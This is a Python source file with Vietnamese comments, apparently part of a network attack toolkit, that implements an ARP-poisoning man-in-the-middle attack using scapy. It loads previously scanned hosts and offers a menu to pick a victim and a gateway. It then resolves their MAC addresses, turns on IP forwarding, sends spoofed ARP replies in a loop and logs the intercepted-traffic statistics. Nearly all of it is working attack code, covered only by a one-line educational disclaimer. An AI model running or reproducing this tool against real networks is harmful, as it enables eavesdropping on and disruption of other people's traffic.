#!/usr/bin/env python3
"""
Man-in-the-Middle (MitM) Attack Module - Phiên bản tối ưu hóa
Thực hiện tấn công ARP Poisoning để xen vào giữa hai thiết bị.
*** CẢNH BÁO: CHỈ SỬ DỤNG CHO MỤC ĐÍCH GIÁO DỤC VÀ NGHIÊN CỨU. ***
"""

import threading
import time
import os
import socket
import logging
import netifaces
import json
import ssl
import struct
import re
from typing import Optional, Tuple, Dict, List
from scapy.all import Ether, ARP, srp, sendp, sniff, IP, TCP, UDP, Raw
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

def get_local_ip(interface: str) -> Optional[str]:
    """Lấy địa chỉ IP của máy đang chạy script trên interface được chỉ định."""
    try:
        # Sử dụng netifaces để lấy IP local
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            return addrs[netifaces.AF_INET][0]['addr']
    except Exception:
        pass
    
    # Fallback: sử dụng socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return None

def get_mac(ip: str, interface: str, retries: int = 3, timeout: int = 2) -> Optional[str]:
    """
    Lấy địa chỉ MAC của một IP trong mạng LAN với cơ chế retry.
    
    :param ip: Địa chỉ IP mục tiêu
    :param interface: Interface mạng
    :param retries: Số lần thử lại
    :param timeout: Thời gian chờ cho mỗi lần thử (giây)
    :return: Địa chỉ MAC hoặc None
    """
    for i in range(retries):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), 
                        timeout=timeout, iface=interface, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            logging.warning(f"Không nhận được phản hồi ARP từ {ip} (lần thử {i+1}/{retries})")
        except Exception as e:
            logging.error(f"Lỗi khi lấy MAC của {ip} (lần thử {i+1}/{retries}): {e}")
        
        if i < retries - 1:
            time.sleep(1) # Chờ 1 giây trước khi thử lại
            
    return None

def get_network_info(interface: str) -> Dict:
    """Lấy thông tin mạng của interface."""
    try:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            ip_info = addrs[netifaces.AF_INET][0]
            return {
                'ip': ip_info['addr'],
                'netmask': ip_info['netmask'],
                'broadcast': ip_info.get('broadcast', '')
            }
    except Exception as e:
        logging.error(f"Lỗi khi lấy thông tin mạng: {e}")
    return {}

class MitmAttacker:
    """
    Lớp thực hiện tấn công Man-in-the-Middle (MitM) tối ưu hóa.
    """
    
    def __init__(self, interface: str, victim_ip: str, gateway_ip: str,
                 enable_sniffing: bool = True, poison_interval: int = 2):
        """
        Khởi tạo MitM attacker.
        
        :param interface: Tên interface mạng
        :param victim_ip: IP của nạn nhân
        :param gateway_ip: IP của gateway (router)
        :param enable_sniffing: Bật packet sniffing
        :param poison_interval: Khoảng thời gian gửi ARP poison (giây)
        """
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.poison_interval = poison_interval
        self.enable_sniffing = enable_sniffing
        
        self.attacker_ip = get_local_ip(interface)
        if not self.attacker_ip:
            raise ValueError(f"Không thể lấy IP local trên interface {interface}")
        
        # Cơ chế điều khiển
        self.stop_event = threading.Event()
        self.threads = []
        
        # Initialize missing attributes
        self.ssl_sessions = {}
        self.https_data = []
        
        self.stats = {
            'arp_packets_sent': 0,
            'packets_intercepted': 0,
            'ssl_handshakes': 0,
            'http_requests': 0,
            'dns_queries': 0,
            'start_time': None,
        }
        self.stats_lock = threading.Lock()
        
        # MAC addresses
        self.victim_mac = None
        self.gateway_mac = None
        
        # IP forwarding state
        self.original_ip_forward = self._get_ip_forward_state()
        
        # Logging
        self._setup_logging()
        
    def _setup_logging(self):
        """Thiết lập logging."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('mitm_attack.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def _load_device_database(self) -> Dict:
        """Tải cơ sở dữ liệu thiết bị từ file YAML hoặc JSON."""
        devices = {}
        try:
            yaml_file = 'devices.yaml'
            if os.path.exists(yaml_file):
                import yaml
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'devices' in data:
                        return data.get('devices', {})
                    return data if isinstance(data, dict) else {}
            
            json_file = 'devices.txt'
            if os.path.exists(json_file):
                with open(json_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self.logger.warning(f"Không thể tải DB thiết bị, sẽ dựa vào ARP requests: {e}")
        return devices

    def load_targets_from_scan(self, exclude_router: bool = True, exclude_attacker: bool = True) -> List[str]:
        """
        Tải danh sách mục tiêu từ kết quả quét mạng.
        
        :param exclude_router: Loại trừ IP router (thường là .1)
        :param exclude_attacker: Loại trừ IP của attacker
        :return: Danh sách IP mục tiêu
        """
        targets = []
        
        try:
            # Thử đọc file YAML trước
            yaml_file = 'devices.yaml'
            if os.path.exists(yaml_file):
                import yaml
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'devices' in data:
                        devices = data['devices']
                    else:
                        devices = data  # Fallback nếu không có cấu trúc metadata
            else:
                # Fallback về JSON
                json_file = 'devices.txt'
                if os.path.exists(json_file):
                    with open(json_file, 'r') as f:
                        devices = json.load(f)
                else:
                    self.logger.warning("Không tìm thấy file devices.yaml hoặc devices.txt. Vui lòng quét mạng trước.")
                    return targets
            
            for ip, info in devices.items():
                if info.get('status') == 'up':
                    # Loại trừ router (thường là .1)
                    if exclude_router and ip.endswith('.1'):
                        self.logger.info(f"Loại trừ router: {ip}")
                        continue
                        
                    # Loại trừ attacker
                    if exclude_attacker and ip == self.attacker_ip:
                        self.logger.info(f"Loại trừ attacker: {ip}")
                        continue
                        
                    targets.append(ip)
                    
            self.logger.info(f"Đã tải {len(targets)} mục tiêu từ devices.yaml")
                
        except Exception as e:
            self.logger.error(f"Lỗi khi tải targets: {e}")
            
        return targets
    
    def _select_target_from_menu(self, available_targets: List[str], prompt: str) -> Optional[str]:
        """
        Hiển thị menu chọn 1 mục tiêu cụ thể.
        
        :param available_targets: Danh sách các mục tiêu có sẵn
        :param prompt: Tiêu đề cho menu
        :return: IP của mục tiêu được chọn
        """
        print(f"\n=== {prompt.upper()} ===")
        devices_info = {}
        try:
            # Thử đọc YAML trước
            yaml_file = 'devices.yaml'
            if os.path.exists(yaml_file):
                import yaml
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'devices' in data:
                        devices_info = data['devices']
                    else:
                        devices_info = data
            else:
                # Fallback về JSON
                json_file = 'devices.txt'
                if os.path.exists(json_file):
                    with open(json_file, 'r') as f:
                        devices_info = json.load(f)
        except:
            pass
            
        for i, ip in enumerate(available_targets, 1):
            device_info = devices_info.get(ip, {})
            hostname = device_info.get('hostname', 'Unknown')
            vendor = device_info.get('mac_vendor', device_info.get('vendor', 'Unknown'))
            os_info = device_info.get('os', 'Unknown')
            device_type = device_info.get('device_type', 'Unknown')
            risk_level = device_info.get('security_info', {}).get('risk_level', 'low')
            
            # Hiển thị thông tin chi tiết hơn
            print(f"{i}. {ip} - {hostname}")
            print(f"   📱 {vendor} | {os_info} | {device_type.title()} | Risk: {risk_level.upper()}")
        
        while True:
            try:
                choice = input("\nChọn mục tiêu (1-{}): ".format(len(available_targets)))
                choice = int(choice)
                
                if 1 <= choice <= len(available_targets):
                    selected_ip = available_targets[choice - 1]
                    self.logger.info(f"Đã chọn mục tiêu: {selected_ip}")
                    return selected_ip
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
            except ValueError:
                print("Vui lòng nhập số.")
        
    def _get_ip_forward_state(self) -> str:
        """Kiểm tra trạng thái IP forwarding hiện tại."""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip()
        except Exception:
            return "0"

    def _set_ip_forward(self, state: str) -> bool:
        """Bật hoặc tắt IP forwarding."""
        if os.geteuid() != 0:
            self.logger.warning("Cần quyền root để thay đổi IP forwarding.")
            return False
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(state)
            self.logger.info(f"IP forwarding đã được đặt thành: {state}")
            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi thay đổi IP forwarding: {e}")
            return False

    def _resolve_targets(self) -> bool:
        """Phân giải MAC của cả hai mục tiêu, ưu tiên từ DB."""
        self.logger.info(f"Đang phân giải MAC của {self.victim_ip} (victim) và {self.gateway_ip} (gateway)...")
        
        device_db = self._load_device_database()

        # Resolve victim MAC
        victim_info = device_db.get(self.victim_ip)
        if victim_info and victim_info.get('mac_address'):
            self.victim_mac = victim_info['mac_address']
            self.logger.info(f"Tìm thấy MAC của victim trong DB: {self.victim_mac}")
        else:
            self.logger.info(f"Không tìm thấy MAC của victim trong DB, đang gửi ARP request...")
            self.victim_mac = get_mac(self.victim_ip, self.interface)

        if not self.victim_mac:
            self.logger.error(f"Không tìm thấy MAC của victim {self.victim_ip}")
            return False
        self.logger.info(f"MAC của victim {self.victim_ip}: {self.victim_mac}")

        # Resolve gateway MAC
        gateway_info = device_db.get(self.gateway_ip)
        if gateway_info and gateway_info.get('mac_address'):
            self.gateway_mac = gateway_info['mac_address']
            self.logger.info(f"Tìm thấy MAC của gateway trong DB: {self.gateway_mac}")
        else:
            self.logger.info(f"Không tìm thấy MAC của gateway trong DB, đang gửi ARP request...")
            self.gateway_mac = get_mac(self.gateway_ip, self.interface)

        if not self.gateway_mac:
            self.logger.error(f"Không tìm thấy MAC của gateway {self.gateway_ip}")
            return False
        self.logger.info(f"MAC của gateway {self.gateway_ip}: {self.gateway_mac}")
        
        return True

    def _poison_loop(self):
        """Vòng lặp gửi các gói tin ARP giả mạo."""
        # Lừa victim: nói rằng IP của gateway có MAC của attacker
        packet_to_victim = ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.victim_mac)
        # Lừa gateway: nói rằng IP của victim có MAC của attacker
        packet_to_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac)
        
        self.logger.info("Bắt đầu vòng lặp ARP poisoning...")
        
        while not self.stop_event.is_set():
            try:
                sendp(packet_to_victim, iface=self.interface, verbose=0)
                sendp(packet_to_gateway, iface=self.interface, verbose=0)
                
                with self.stats_lock:
                    self.stats['arp_packets_sent'] += 2
                    
                time.sleep(self.poison_interval)
                
            except Exception as e:
                self.logger.error(f"Lỗi trong vòng lặp ARP poison: {e}")
                break
                
        self.logger.info("Đã dừng vòng lặp ARP poisoning.")

    def _monitor_attack(self):
        """Giám sát và hiển thị thống kê tấn công."""
        while not self.stop_event.is_set():
            time.sleep(10)  # Hiển thị thống kê mỗi 10 giây
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
                
                self.logger.info(
                    f"📊 Thống kê MitM: {self.stats['packets_intercepted']} gói tin, "
                    f"{self.stats['arp_packets_sent']} ARP packets, "
                    f"{self.stats['ssl_handshakes']} SSL handshakes, "
                    f"{self.stats['http_requests']} HTTP requests, "
                    f"{self.stats['dns_queries']} DNS queries"
                )
                
                # Hiển thị SSL sessions
                if self.ssl_sessions:
                    self.logger.info(f"🔒 SSL Sessions: {len(self.ssl_sessions)} active")
                    for session_key, session_info in list(self.ssl_sessions.items())[:3]:  # Hiển thị 3 session đầu
                        self.logger.info(f"   {session_info['client']} -> {session_info['server']}")

    def _restore_arp(self):
        """Khôi phục lại bảng ARP của các mục tiêu."""
        if not self.victim_mac or not self.gateway_mac:
            return
            
        self.logger.info("Đang khôi phục bảng ARP...")
        
        # Gửi broadcast để khôi phục ARP cho victim
        packet_to_victim = ARP(
            op=2, pdst=self.victim_ip, psrc=self.gateway_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac
        )
        # Gửi broadcast để khôi phục ARP cho gateway
        packet_to_gateway = ARP(
            op=2, pdst=self.gateway_ip, psrc=self.victim_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac
        )
        
        for _ in range(5):  # Gửi 5 lần để đảm bảo
            sendp([packet_to_victim, packet_to_gateway], iface=self.interface, verbose=0)
            time.sleep(0.5)
            
        self.logger.info("Khôi phục ARP hoàn tất.")

    def start_attack(self) -> bool:
        """Bắt đầu cuộc tấn công MitM."""
        self.logger.info(f"Bắt đầu tấn công MitM: {self.victim_ip} (Victim) <--> {self.gateway_ip} (Gateway)")
        
        # Hiển thị thông tin mạng
        network_info = get_network_info(self.interface)
        if network_info:
            self.logger.info(f"Interface {self.interface}: {network_info['ip']}/{network_info['netmask']}")
        
        # Phân giải MAC
        if not self._resolve_targets():
            return False
        
        # Bật IP forwarding
        if not self._set_ip_forward("1"):
            self.logger.warning("Không thể bật IP forwarding. Tấn công có thể làm gián đoạn mạng.")
        
        self.stop_event.clear()
        self.stats['start_time'] = time.time()
        
        # Khởi động các threads
        threads_to_start = [
            (self._poison_loop, "ARP Poison"),
            (self._monitor_attack, "Monitor")
        ]
        
        for func, name in threads_to_start:
            thread = threading.Thread(target=func, daemon=True, name=name)
            self.threads.append(thread)
            thread.start()
            
        self.logger.info(f"Tấn công đã bắt đầu với {len(self.threads)} threads. Nhấn Ctrl+C để dừng.")
        return True

    def stop_attack(self):
        """Dừng tấn công MitM và khôi phục ARP tables."""
        self.logger.info("🛑 Đang dừng tấn công MitM...")
        self.stop_event.set()
        
        # Dừng các threads
        for thread in self.threads:
            thread.join(timeout=2)
        self.threads.clear()
        
        # Khôi phục ARP tables
        self._restore_arp()
        
        # Khôi phục IP forwarding
        self._set_ip_forward(self.original_ip_forward)

    def get_stats(self) -> Dict:
        """Lấy thống kê hiện tại."""
        with self.stats_lock:
            return self.stats.copy()
    
    def is_attacking(self) -> bool:
        """Kiểm tra xem có đang tấn công không."""
        return not self.stop_event.is_set()

    def save_https_data(self, filename: str = None):
        """Lưu dữ liệu HTTPS đã thu thập."""
        try:
            if filename is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"https_data_{timestamp}.json"
            
            data = {
                'timestamp': datetime.now().isoformat(),
                'victim_ip': self.victim_ip,
                'gateway_ip': self.gateway_ip,
                'ssl_sessions': self.ssl_sessions,
                'https_data': self.https_data,
                'stats': self.stats
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)
                
            self.logger.info(f"💾 Đã lưu dữ liệu HTTPS vào: {filename}")
            
        except Exception as e:
            self.logger.error(f"Lỗi khi lưu dữ liệu HTTPS: {e}")
    
    def get_https_summary(self) -> Dict:
        """Lấy tóm tắt dữ liệu HTTPS."""
        summary = {
            'total_ssl_sessions': len(self.ssl_sessions),
            'total_https_requests': self.stats['http_requests'],
            'total_dns_queries': self.stats['dns_queries'],
            'domains_visited': set(),
            'ssl_servers': set()
        }
        
        # Thống kê domains và servers
        for session_info in self.ssl_sessions.values():
            if 'server' in session_info:
                summary['ssl_servers'].add(session_info['server'])
                # Thêm domain từ server name
                if '.' in session_info['server']:
                    summary['domains_visited'].add(session_info['server'])
        
        summary['domains_visited'] = list(summary['domains_visited'])
        summary['ssl_servers'] = list(summary['ssl_servers'])
        
        return summary

def run_mitm_attack(interface: str, **kwargs):
    """
    Hàm tiện ích để chạy tấn công MitM với menu lựa chọn.
    
    :param interface: Interface mạng
    :param kwargs: Các tham số khác cho MitmAttacker
    """
    try:
        print("\n=== MITM ATTACK MODULE ===")
        # Dummy attacker để truy cập các hàm tiện ích
        dummy_attacker = MitmAttacker(interface, "127.0.0.1", "127.0.0.1")
        
        # 1. Tải danh sách mục tiêu
        all_targets = dummy_attacker.load_targets_from_scan(exclude_router=False, exclude_attacker=True)
        if not all_targets:
            print("[-] Không tìm thấy thiết bị nào. Vui lòng chạy 'scan' trước.")
            return

        # 2. Chọn nạn nhân (victim)
        victim_targets = [t for t in all_targets if not t.endswith('.1')]
        if not victim_targets:
            print("[-] Không có nạn nhân nào phù hợp để tấn công (đã loại trừ gateway).")
            return
        victim_ip = dummy_attacker._select_target_from_menu(victim_targets, "CHỌN NẠN NHÂN (VICTIM)")
        if not victim_ip:
            print("[-] Đã hủy tấn công.")
            return

        # 3. Chọn gateway
        gateway_targets = [t for t in all_targets if t != victim_ip]
        gateway_ip = dummy_attacker._select_target_from_menu(gateway_targets, "CHỌN GATEWAY (ROUTER)")
        if not gateway_ip:
            print("[-] Đã hủy tấn công.")
            return

        # 4. Khởi tạo và bắt đầu tấn công
        attacker = MitmAttacker(interface, victim_ip, gateway_ip, **kwargs)
        
        if attacker.start_attack():
            try:
                while attacker.is_attacking():
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Người dùng yêu cầu dừng...")
        
        attacker.stop_attack()

    except KeyboardInterrupt:
        print("\n[*] Hủy tấn công.")
    except Exception as e:
        logging.error(f"Lỗi không mong muốn trong MitM: {e}")
